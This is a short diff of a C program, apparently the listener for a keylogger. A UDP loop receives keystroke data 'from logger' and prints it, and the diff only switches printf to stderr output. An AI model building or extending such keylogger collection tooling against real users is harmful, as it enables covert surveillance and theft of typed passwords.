@@ -33,14 +33,14 @@ int main() {
     }
     
     // loop collects input from keylogger then prints
-    printf("waiting for logger...\n");
+    fprintf(stderr, "waiting for logger...\n");
     unsigned int client_len = 0;
     while(1) {
         char buffer[BUFF_SIZE] = {0};
         int msg_len = recvfrom(sock, buffer, BUFF_SIZE, 0, 
                       (struct sockaddr *) &caddr, &client_len);
         buffer[msg_len] = '\0'; // add null terminator, just in case
-        printf("from logger: %s\n", buffer);
+        fprintf(stderr, "from logger: %s\n", buffer);
     }
     close(sock);
 }
